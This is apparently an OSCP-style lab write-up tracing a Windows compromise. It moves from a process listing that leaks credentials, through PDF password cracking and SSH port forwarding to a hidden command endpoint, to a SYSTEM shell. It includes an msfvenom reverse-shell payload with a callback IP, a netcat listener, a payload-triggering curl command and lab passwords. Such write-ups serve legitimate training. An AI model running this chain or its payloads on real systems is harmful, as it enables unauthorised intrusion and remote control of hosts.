# Credential Disclosure, SSH Port Forwarding and SYSTEM RCE

## Overview

This attack path demonstrates how information exposed by an internal web application can lead to full SYSTEM-level compromise.

The overall chain is:

```text
Web Enumeration
    ↓
Discover secondary API service
    ↓
POST request exposes running processes
    ↓
Credentials exposed in process command line
    ↓
Base64 decode password
    ↓
SSH / FTP access as ariah
    ↓
Discover password-protected Infrastructure.pdf
    ↓
Crack PDF password
    ↓
Discover hidden HTTP service on port 80
    ↓
Confirm service listening locally with netstat
    ↓
SSH local port forwarding
    ↓
Access hidden command execution endpoint
    ↓
Command execution as NT AUTHORITY\SYSTEM
    ↓
Upload reverse shell payload
    ↓
SYSTEM shell
```

---

# Enumeration

## Initial TCP Scan

Scan all TCP ports:

```bash
sudo nmap $IP -p-
```

Example result:

```text
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
3389/tcp  open  ms-wbt-server
8089/tcp  open  unknown
33333/tcp open  dgi-serv
```

Interesting services:

|Port|Service|
|---|---|
|21|FTP|
|22|SSH|
|135|MSRPC|
|139|NetBIOS|
|3389|RDP|
|8089|HTTP|
|33333|HTTP/API|

---

## Detailed Web Service Enumeration

Run a more detailed scan against the unusual ports:

```bash
sudo nmap $IP -p8089,33333 -A
```

Both services may be identified as:

```text
Microsoft HTTPAPI httpd 2.0
```

When Nmap does not reveal much about an HTTP service, inspect it manually.

```bash
curl http://$IP:8089
```

The page exposes a DevOps dashboard containing several form actions:

```html
<form action='http://TARGET:33333/list-current-deployments' method='GET'>
<form action='http://TARGET:33333/list-running-procs' method='GET'>
<form action='http://TARGET:33333/list-active-nodes' method='GET'>
```

This reveals additional endpoints on port `33333`.

---

# API / HTTP Verb Enumeration

Attempt the discovered endpoints:

```bash
curl http://$IP:33333/list-current-deployments
curl http://$IP:33333/list-running-procs
curl http://$IP:33333/list-active-nodes
```

If they return:

```text
Cannot "GET" /list-running-procs
```

do not assume the endpoint is unusable.

The message indicates that the route exists but may require a different HTTP method.

Try `POST`:

```bash
curl -s -i -X POST -H 'Content-Length: 0' http://$IP:33333/list-running-procs
```

---

# Credential Disclosure Through Process Command Lines

The `/list-running-procs` endpoint returns information about processes running on the Windows host.

One process contains credentials directly within its command line:

```text
cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
```

Important information:

```text
Username: ariah
Password value: Tm93aXNlU2xvb3BUaGVvcnkxMzkK
Protocol: ssh
Server: nickel-dev
```

The password value resembles Base64.

Decode it:

```bash
echo Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 -d
```

Result:

```text
NowiseSloopTheory139
```

Credentials:

```text
ariah:NowiseSloopTheory139
```

## Key Lesson

Process enumeration can disclose:

- Passwords supplied as command-line arguments
    
- Usernames
    
- Configuration files
    
- Service accounts
    
- Internal hostnames
    
- Deployment commands
    
- API keys or tokens
    
- Connection protocols
    

Always inspect the **full command line**, not just the process name.

---

# Initial Access

Test discovered credentials against exposed authentication services.

## SSH

```bash
ssh ariah@$IP
```

Credentials:

```text
Username: ariah
Password: NowiseSloopTheory139
```

Successful authentication provides a Windows shell as:

```text
ariah
```

---

# FTP Enumeration

The credentials also work against FTP.

```bash
ftp $IP
```

Authenticate using:

```text
ariah
NowiseSloopTheory139
```

Enumerate files:

```text
ftp> ls
```

A particularly interesting file is discovered:

```text
Infrastructure.pdf
```

Set binary transfer mode before downloading:

```text
ftp> bin
ftp> recv Infrastructure.pdf
```

Alternatively, because SSH access is already available, check:

```cmd
C:\ftp
```

directly from the target.

---

# Cracking Password-Protected PDFs

Attempting to open `Infrastructure.pdf` reveals that it is password protected.

## Extract PDF Hash

Use John's `pdf2john.pl` utility:

```bash
perl /usr/share/john/pdf2john.pl Infrastructure.pdf | tee pdf_hash
```

Example output:

```text
Infrastructure.pdf:$pdf$4*4*128*...
```

---

## Crack with John

```bash
john pdf_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered password:

```text
ariah4168
```

You can also display previously cracked passwords with:

```bash
john --show pdf_hash
```

---

# Information Disclosure from Infrastructure Documentation

Opening the PDF reveals:

```text
Infrastructure Notes

Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/files
```

The most interesting entry is:

```text
Temporary Command endpoint: http://nickel/?
```

This suggests a command execution interface on HTTP port `80`.

However, port `80` was not accessible during external enumeration.

---

# Internal Service Enumeration

Since shell access has already been obtained, enumerate locally listening services.

From the Windows target:

```cmd
netstat -an
```

Example:

```text
Proto  Local Address          Foreign Address        State
TCP    0.0.0.0:21             0.0.0.0:0              LISTENING
TCP    0.0.0.0:22             0.0.0.0:0              LISTENING
TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
```

Port `80` is listening despite not being reachable externally.

This strongly suggests:

```text
Service listening
+
External Nmap cannot reach it
=
Firewall / network filtering
```

## Key Lesson

Once you obtain access to a machine, compare:

```bash
External Nmap results
```

against:

```cmd
netstat -ano
```

or:

```powershell
Get-NetTCPConnection -State Listen
```

This can reveal **firewalled or internal-only services** that were invisible during the initial external scan.

---

# Bypassing Firewall Restrictions with SSH Local Port Forwarding

Because SSH access is available, create a local port forward to the hidden port `80`.

Syntax:

```bash
ssh -L <LOCAL_PORT>:<TARGET_HOST>:<TARGET_PORT> user@ssh-server
```

For this target:

```bash
sudo ssh -L 80:$IP:80 ariah@$IP
```

This creates:

```text
Kali localhost:80
        ↓
SSH tunnel
        ↓
Target port 80
```

Requests sent to:

```text
http://localhost/
```

are forwarded through SSH to:

```text
http://TARGET:80/
```

> Using local port `80` requires root privileges on Linux. An unprivileged local port such as `8080` could also be used.

Example:

```bash
ssh -L 8080:$IP:80 ariah@$IP
```

Then access:

```text
http://localhost:8080/
```

---

# Hidden Command Execution Endpoint

The infrastructure notes described the endpoint as:

```text
http://nickel/?
```

After establishing the tunnel, test command execution:

```bash
curl 'http://localhost/?whoami'
```

Result:

```text
nt authority\system
```

This demonstrates that the web application is executing supplied commands under the:

```text
NT AUTHORITY\SYSTEM
```

security context.

At this stage, SYSTEM-level command execution has already been achieved.

---

# Obtaining an Interactive SYSTEM Shell

## Generate Reverse Shell Payload

Generate a Windows x64 reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f exe > /tmp/payload.exe
```

Example:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.11 LPORT=443 -f exe > /tmp/payload.exe
```

---

## Transfer Payload with SCP

Because SSH credentials are available, use SCP:

```bash
scp /tmp/payload.exe ariah@$IP:C:\\users\\ariah\\desktop\\payload.exe
```

The payload should now exist at:

```text
C:\Users\ariah\Desktop\payload.exe
```

---

# Start Listener

On Kali:

```bash
sudo nc -nlvp 443
```

---

# Execute Payload Through the Command Endpoint

Use the hidden HTTP service to execute the uploaded payload.

```bash
curl -G 'http://localhost/?' --data-urlencode 'cmd /c C:\\users\\ariah\\desktop\\payload.exe'
```

The `--data-urlencode` option is useful because Windows commands commonly contain:

- Spaces
    
- Backslashes
    
- Special characters
    

that should be properly encoded before being placed in a URL.

---

# Confirm SYSTEM Access

The listener should receive a connection:

```text
Microsoft Windows [Version 10.0.18362.1016]

C:\Windows\system32>
```

Confirm privileges:

```cmd
whoami
```

Expected:

```text
nt authority\system
```

---

# Attack Path Summary

## 1. Discover Web Applications

```bash
sudo nmap $IP -p-
sudo nmap $IP -p8089,33333 -A
```

---

## 2. Inspect DevOps Dashboard

```bash
curl http://$IP:8089
```

Discover:

```text
/list-current-deployments
/list-running-procs
/list-active-nodes
```

---

## 3. Test Alternative HTTP Methods

```bash
curl -s -i -X POST -H 'Content-Length: 0' http://$IP:33333/list-running-procs
```

Discover exposed process command lines.

---

## 4. Recover Credentials

```bash
echo Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 -d
```

Recover:

```text
ariah:NowiseSloopTheory139
```

---

## 5. Obtain SSH Access

```bash
ssh ariah@$IP
```

---

## 6. Download Infrastructure Documentation

```bash
ftp $IP
```

Then:

```text
bin
recv Infrastructure.pdf
```

---

## 7. Crack PDF

```bash
perl /usr/share/john/pdf2john.pl Infrastructure.pdf | tee pdf_hash
john pdf_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Recover:

```text
ariah4168
```

---

## 8. Discover Hidden Service

On the target:

```cmd
netstat -an
```

Identify:

```text
0.0.0.0:80 LISTENING
```

---

## 9. SSH Port Forward

```bash
sudo ssh -L 80:$IP:80 ariah@$IP
```

---

## 10. Test Command Execution

```bash
curl 'http://localhost/?whoami'
```

Result:

```text
nt authority\system
```

---

## 11. Generate Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f exe > /tmp/payload.exe
```

---

## 12. Upload Payload

```bash
scp /tmp/payload.exe ariah@$IP:C:\\users\\ariah\\desktop\\payload.exe
```

---

## 13. Start Listener

```bash
sudo nc -nlvp 443
```

---

## 14. Trigger Payload

```bash
curl -G 'http://localhost/?' --data-urlencode 'cmd /c C:\\users\\ariah\\desktop\\payload.exe'
```

Confirm:

```cmd
whoami
```

```text
nt authority\system
```

---

# Key Takeaways

### Try Different HTTP Methods

If:

```text
Cannot "GET" /endpoint
```

is returned, the endpoint may still exist.

Try methods such as:

```bash
curl -X POST ...
```

Do not immediately discard the endpoint.

---

### Inspect Process Command Lines

Process listings can expose credentials because administrators and applications sometimes pass secrets directly as command-line arguments.

Look for:

```text
-p
--password
--user
--token
--key
--server
--protocol
```

---

### Base64 Is Encoding, Not Encryption

Strings such as:

```text
Tm93aXNlU2xvb3BUaGVvcnkxMzkK
```

should immediately be tested as Base64:

```bash
echo '<STRING>' | base64 -d
```

---

### Reuse Discovered Credentials

Whenever credentials are recovered, test them against other available services where appropriate:

```text
SSH
FTP
RDP
SMB
Web Applications
Administrative Interfaces
```

Credential reuse frequently creates the next step in an attack path.

---

### Documents Are Valuable Enumeration Targets

Files such as:

```text
.pdf
.txt
.docx
.xlsx
.config
.xml
.yaml
.yml
```

may contain:

- Network diagrams
    
- Internal hostnames
    
- Administrative endpoints
    
- Credentials
    
- Backup locations
    
- Internal URLs
    
- Operational procedures
    

Password protection does not necessarily make the information inaccessible if the password is weak.

---

### Compare External and Internal Port Enumeration

External:

```bash
nmap
```

Internal:

```cmd
netstat -ano
```

A service visible internally but not externally may indicate firewall filtering.

These services are excellent candidates for tunnelling.

---

### SSH Local Port Forwarding

Remember:

```bash
ssh -L LOCAL_PORT:DESTINATION_HOST:DESTINATION_PORT user@SSH_HOST
```

Think:

```text
My localhost
    →
SSH connection
    →
Service reachable from SSH server
```

Example:

```bash
ssh -L 8080:127.0.0.1:80 user@$IP
```

Then:

```bash
curl http://127.0.0.1:8080
```

---

# OSCP / CTF Checklist

When you obtain SSH access to a target:

-  Run `whoami`
    
-  Run `whoami /priv`
    
-  Run `whoami /groups`
    
-  Run `hostname`
    
-  Run `ipconfig /all`
    
-  Run `route print`
    
-  Run `arp -a`
    
-  Run `netstat -ano`
    
-  Compare listening ports against the original Nmap scan
    
-  Investigate services inaccessible externally
    
-  Check user directories
    
-  Check FTP/web roots
    
-  Search for configuration and infrastructure documentation
    
-  Inspect interesting files
    
-  Crack password-protected files where appropriate
    
-  Test discovered credentials against available services
    
-  Consider SSH port forwarding for filtered services
    

---

# Quick Command Reference

```bash
# Full TCP scan
sudo nmap $IP -p-

# Detailed scan
sudo nmap $IP -p8089,33333 -A

# Inspect web application
curl http://$IP:8089

# POST to API endpoint
curl -s -i -X POST -H 'Content-Length: 0' http://$IP:33333/list-running-procs

# Base64 decode
echo '<BASE64>' | base64 -d

# SSH
ssh ariah@$IP

# FTP
ftp $IP

# PDF hash extraction
perl /usr/share/john/pdf2john.pl Infrastructure.pdf | tee pdf_hash

# Crack PDF
john pdf_hash --wordlist=/usr/share/wordlists/rockyou.txt

# Local port forwarding
sudo ssh -L 80:$IP:80 ariah@$IP

# Test command execution
curl 'http://localhost/?whoami'

# Generate reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f exe > /tmp/payload.exe

# Upload payload
scp /tmp/payload.exe ariah@$IP:C:\\users\\ariah\\desktop\\payload.exe

# Listener
sudo nc -nlvp 443

# Trigger payload
curl -G 'http://localhost/?' --data-urlencode 'cmd /c C:\\users\\ariah\\desktop\\payload.exe'
```